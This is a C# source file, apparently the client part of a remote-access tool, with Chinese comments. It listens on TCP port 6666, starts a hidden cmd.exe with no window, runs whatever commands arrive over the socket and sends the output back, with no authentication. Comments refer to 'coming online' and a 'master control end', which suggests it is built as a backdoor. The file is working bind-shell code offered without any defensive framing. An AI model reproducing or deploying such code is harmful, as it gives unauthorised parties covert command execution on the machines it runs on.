using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RemoteConsole_Client
{
    internal class Program
    {
        static void Main(string[] args)
        {
            NetHelper helper = new NetHelper();
            helper.Init();
        }
    }

    class Globle
    {
        public static int Port = 9999;
        public static int UDP_Port = 9999;
        public static bool _IsListen_Port = true;
        public static bool _IsResvice_Message = true;
        public static int Lis_Port = 6666;
    }
    public class NetHelper
    {

        TcpClient Client;
        TcpListener Lis;
        NetworkStream Stream;
        Socket socket;
        Socket Lis_socket;
        private RemoteConsole remoteConsole;

        String CMD_List = "$ActiveDos||";
        String Online_Order = "$Online||";
        public void Init()
        {
            Lis = new TcpListener(Globle.Lis_Port);
            Lis.Start();
            Thread threadLisMySelf = new Thread(Listen_Port);
            threadLisMySelf.Start();
        }

        /// <summary>
        /// 此方法用于监听上线端口
        /// </summary>
        public void Listen_Port()
        {
            while (Globle._IsListen_Port)
            {
                Lis_socket = Lis.AcceptSocket();  //如果有客户端请求则创建套接字
                Thread thread = new Thread(Res_Message);
                remoteConsole = new RemoteConsole("cmd.exe", new NetworkStream(Lis_socket));
                remoteConsole.Init();
                thread.Start();
            }
        }

        /// <summary>
        /// 此方法负责接收主控端命令
        /// 并且传递到处理方法种
        /// </summary>
        public void Res_Message()
        {
            while (Globle._IsResvice_Message)
            {
                try
                {
                    using (NetworkStream ns = new NetworkStream(this.Lis_socket))
                    {
                        try
                        {
                            byte[] bb = new byte[1024];
                            int Res_Len = ns.Read(bb, 0, bb.Length);
                            string cmd = Encoding.Default.GetString(bb, 0, Res_Len);
                            //Console.WriteLine(cmd);
                            remoteConsole.Execute(cmd);
                        }
                        catch (Exception ex)
                        {
                            //MessageBox.Show("Error Receive2 " + ex.ToString());
                        }
                    }
                }
                catch (Exception ex)
                { };
            }
        }
    }
    public class RemoteConsole
    {
        private NetworkStream Ns;
        readonly Process _consoleProcess = new Process();
        private string ProcessName { get; set; }

        public RemoteConsole(string processName, NetworkStream ns)
        {
            ProcessName = processName;
            Ns = ns;
        }

        public void Init()
        {
            _consoleProcess.StartInfo.CreateNoWindow = true;
            _consoleProcess.StartInfo.FileName = ProcessName;
            _consoleProcess.StartInfo.UseShellExecute = false;
            _consoleProcess.StartInfo.RedirectStandardError = true;
            _consoleProcess.StartInfo.RedirectStandardInput = true;
            _consoleProcess.StartInfo.RedirectStandardOutput = true;

            _consoleProcess.Start();

            Register(_consoleProcess.StandardError, MessageHandle);
            Register(_consoleProcess.StandardOutput, MessageHandle);

        }

        public void Execute(string cmd)
        {
            _consoleProcess.StandardInput.WriteLine(cmd);
        }

        private void MessageHandle(string msg)
        {
            try
            {
                Ns.Write(Encoding.Default.GetBytes(msg), 0, Encoding.Default.GetBytes(msg).Length);
                Ns.Flush();
            }
            catch (Exception ex)
            { }
        }

        private void Register(StreamReader reader, Action<string> messageHandle)
        {
            ThreadPool.QueueUserWorkItem((state) =>
            {
                string output;
                while ((output = reader.ReadLine()) != null)
                {
                    messageHandle(output);
                    Thread.Sleep(50);
                }
            });
        }
    }
}
